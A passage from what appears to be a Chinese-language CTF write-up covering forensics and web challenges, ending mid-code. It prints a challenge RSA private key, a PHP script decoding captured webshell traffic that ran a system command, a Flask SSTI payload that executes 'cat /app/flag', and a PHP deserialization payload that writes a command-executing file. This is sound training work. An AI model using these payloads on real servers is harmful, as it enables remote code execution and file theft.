+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">-----BEGIN</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> PRIVATE</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> KEY-----</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGAaxYIU7D5lIndIBLu</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">bRRywJZiAQ90QiRjuHAIsyyka69Wl1n9K4W9/hjNDeI5BP14oADSmOqLKmj8nw2w</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">bk0mDZ0KbWfT3eCxttGoplMEoCqKizTMdHGe7MUaK9A2CKIHOsHQhkpAmwLcDzNr</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">bLg9nx0hjPUDefqwCn1q7B/IQPMCAwEAAQKBgEQaQ/ttrpwfvUhbodQvT/dY7ET+</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">XhJ+cAjo/y9r8bkmTmx853xZVwYVIbt1pouc46zmOQjVCOJU2GwS2aScXdkx8Fm1</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">YQJqzbxcZ4oEA/f66E99560um3RRsa7DWKwNdIcU4wukyfgx5fILoiuE8ThjG23V</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">b3oDOzaIhyCrcO65AkEApZJjxmMk0AB8ZUkhIqw+2gD4N5SPisae+aFfLgLt14H4</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">VwSZxl2kRs7yhZGl5spFlxdotym3YS/30aY3/+3GPQJBAKWSY8ZjJNAAfGVJISKs</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">PtoA+DeUj4rGnvmhXy4C7deB+FcEmcZdpEbO8oWRpebKRZcXaLcpt2Ev99GmN//t</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">xu8CQQCf2DInBvQ1MyLlDbLFrJCJGsKHtg7WJWa5DQe8fetsUPeV2sUycpj0Gzqb</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">pL8Ljl+cvGbF3apCU3LmnZgWplDpAkB+i1EYqmPTWdu5adgacP0kj4Mmr7O5xC5y</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">6kQdnX18rchJcam5843/1GGFdpkOuF/Rp8GP5CFU9V157Yl1YJ0fAkAvcGpACEWD</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">gZPSO8jGVr6XoVtA0tW2JMX/nPoxI1soLG38Kwaqc/+bepMmRQ50dlvZUA4uufmT</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">N3OWrL+BavU0</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">-----END</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> PRIVATE</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> KEY-----</span></span></code></pre>
+<p>这种密钥都是RSA的密钥，尝试去赛博厨子中解密之前拿到的数据
+<img src="https://static.synex.space/article/Pasted%20image%2020250118143305.png" alt="">
+拿到flag<code>flag{343907d2-35a3-4bfe-a5e1-5d6615157851}</code></p>
+<h2 id="第2天-weevils-whisper">第2天 Weevil’s Whisper</h2>
+<p>做法和哥斯拉差不多，但是没加密，就一个异或函数，脚本如下,前面很多没用的数据，我是挨个解析的，然后直接把流数据全部丢进来就可以拿到数据
+这个原本的脚本可以在前几个流中拿到</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="php"><code><span class="line"><span style="--shiki-light:#179299;--shiki-dark:#C792EA">&#x3C;?</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">php</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$k</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">161ebd7d</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$kh</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">45089b3446ee</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$kf</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">4e0d86dbcf92</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$p</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">lFDu8RwONqmag5ex</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA">function</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> x</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">(</span><span style="--shiki-light:#E64553;--shiki-dark:#BEC5D4">$</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#BEC5D4;--shiki-dark-font-style:inherit">t</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#E64553;--shiki-dark:#BEC5D4"> $</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#BEC5D4;--shiki-dark-font-style:inherit">k</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">)</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">{</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">    $c</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit"> strlen</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">k</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">);</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">    $l</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit"> strlen</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">t</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">);</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">    $o</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> ""</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    for</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> (</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$i</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $i</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> &#x3C;</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $l</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> )</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> {</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        for</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> (</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$j</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> (</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$j</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> &#x3C;</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $c</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> &#x26;&#x26;</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $i</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> &#x3C;</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $l</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">);</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $j</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">++</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $i</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">++</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> {</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">            $o</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> .=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $t</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">[</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$i</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">]</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> ^</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $k</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">[</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$j</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">];</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">        }</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">    }</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    return</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $o</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">}</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$data</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">POST /shell1.php HTTP/1.1</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">Accept-Encoding: identity</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">Content-Type: application/x-www-form-urlencoded</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">Content-Length: 299</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">Host: 192.168.234.130</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; nl-nl) AppleWebKit/416.11 (KHTML, like Gecko) Safari/312</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">Connection: close</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">1S/#+4)~)z,\kA$u45089b3446eeSap86K9utSQlcG4AekDwIVMXH2nAbKAJHQZj7APeyeQI9ax+RrWMwxyS7ISBXyumsItkFg01j+OJ7iq21y5lz0ptqaP+jE57V450hKaS8GJEp1T8iQlB5JnHtwVWNuyzEy4GXjrmsBRYBvHPLLIJ2bmbhu63DEuitVx1lzAEkXJC9krmCFDUhRTckw7wwusTUY+c5KxMImweOfv5NatpKTMZTHvRnUVgWlMM+55bSJfINEScKUo4e0d86dbcf923^0(~}9G(y.l>nD"HTTP/1.1 200 OK</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">Date: Tue, 24 Dec 2024 15:58:42 GMT</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">X-Powered-By: PHP/7.3.4</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">Connection: close</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">Transfer-Encoding: chunked</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">Content-Type: text/html; charset=UTF-8</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">lFDu8RwONqmag5ex45089b3446eeSap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==4e0d86dbcf92</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">// 输入</span></span>
+<span class="line"><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">@</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">preg_match</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#EA76CB;--shiki-dark:#D9F5DD">"/</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">kh</span><span style="--shiki-light:#40A02B;--shiki-dark:#5CA7E4">(.</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">+</span><span style="--shiki-light:#40A02B;--shiki-dark:#5CA7E4">)</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">kf</span><span style="--shiki-light:#EA76CB;--shiki-dark:#D9F5DD">/"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> $</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">data</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> $</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">m</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">);</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">echo</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> @</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">gzuncompress</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">@</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">x</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">@</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">base64_decode</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">m</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">[</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C">1</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">]),</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> $</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">k</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">));</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">// 输出</span></span>
+<span class="line"><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">@</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">preg_match</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#EA76CB;--shiki-dark:#D9F5DD">"/</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">p</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">kh</span><span style="--shiki-light:#40A02B;--shiki-dark:#5CA7E4">(.</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">+</span><span style="--shiki-light:#40A02B;--shiki-dark:#5CA7E4">)</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">kf</span><span style="--shiki-light:#EA76CB;--shiki-dark:#D9F5DD">/"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> $</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">data</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> $</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">r</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">);</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">echo</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit"> gzuncompress</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">x</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">((</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">base64_decode</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">r</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">[</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C">1</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">])),</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> $</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">k</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">));</span></span></code></pre>
+<p>输出如下</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="text"><code><span class="line"><span>try {chdir('C:\Applications\phpStudy\phpStudy_64\phpstudy_pro\WWW');@error_reporting(0);@system('type flag.txt 2>&#x26;1');}catch(Exception $e){echo "4X6l6ZERR".$e->getTrace()[0]["function"].": ".$e->getMessage()."4X6l6ZERR";}flag{arsjxh-sjhxbr-3rdd78dfsh-3ndidjl}</span></span></code></pre>
+<p>即flag<code>flag{arsjxh-sjhxbr-3rdd78dfsh-3ndidjl}</code></p>
+<h2 id="第2天-find-me">第2天 find me</h2>
+<p>里面有个密码压缩包，然后目录结构是我的世界的，给他导入到我的世界中
+<img src="https://static.synex.space/article/Pasted%20image%2020250118172153.png" alt="">
+导入之后用游戏打开会提示
+<img src="https://static.synex.space/article/5e2c99efc54d3b2437706a3a61b0386.png" alt="">
+搜寻之后会拿到一个附魔书里面有一个key
+<img src="https://static.synex.space/article/Pasted%20image%2020250118172414.png" alt="">
+密码即：cwqeafvfwqead
+解密后拿到密文
+<img src="https://static.synex.space/article/Pasted%20image%2020250118172521.png" alt="">
+把flag放上头，随波逐流可以一把梭出来
+<img src="https://static.synex.space/article/Pasted%20image%2020250118172936.png" alt="">
+flag{535e0a20-189e-4049-ab30-dec60bac91b8}</p>
+<h1 id="web">WEB</h1>
+<h2 id="第1天-easy_flask">第1天 easy_flask</h2>
+<p>这是一个<code>SSTI</code>,没学过这一块，后续整理，具体的构造方式为<code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /app/flag').read() }}</code></p>
+<h2 id="第1天-file_copy">第1天 file_copy</h2>
+<p>没接触过这种题目，后续整理，考点主要是<code>PHP Filter链——基于oracle的文件读取攻击</code>
+可以参考下面连接</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/12939">https://xz.aliyun.com/t/12939</a></li>
+<li><a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></li>
+</ul>
+<h2 id="第2天-easy_ser">第2天 easy_ser</h2>
+<p>payload构造如下</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="php"><code><span class="line"><span style="--shiki-light:#179299;--shiki-dark:#C792EA">&#x3C;?</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">php</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA">class</span><span style="--shiki-light:#DF8E1D;--shiki-light-font-style:italic;--shiki-dark:#FFCB8B;--shiki-dark-font-style:inherit"> STU</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">{</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    public</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $stu</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">}</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA">class</span><span style="--shiki-light:#DF8E1D;--shiki-light-font-style:italic;--shiki-dark:#FFCB8B;--shiki-dark-font-style:inherit"> SDU</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">{</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    public</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $Dazhuan</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">}</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA">class</span><span style="--shiki-light:#DF8E1D;--shiki-light-font-style:italic;--shiki-dark:#FFCB8B;--shiki-dark-font-style:inherit"> CTF</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">{</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    public</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $hackman</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">PD89YGNhdCAvZipgOw==</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    public</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4"> $filename</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">aaaa.php</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">}</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">$sdu</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#8839EF;--shiki-dark:#7FDBCA"> new</span><span style="--shiki-light:#DF8E1D;--shiki-light-font-style:italic;--shiki-dark:#FFCB8B;--shiki-dark-font-style:inherit"> SDU</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">();</span></span>
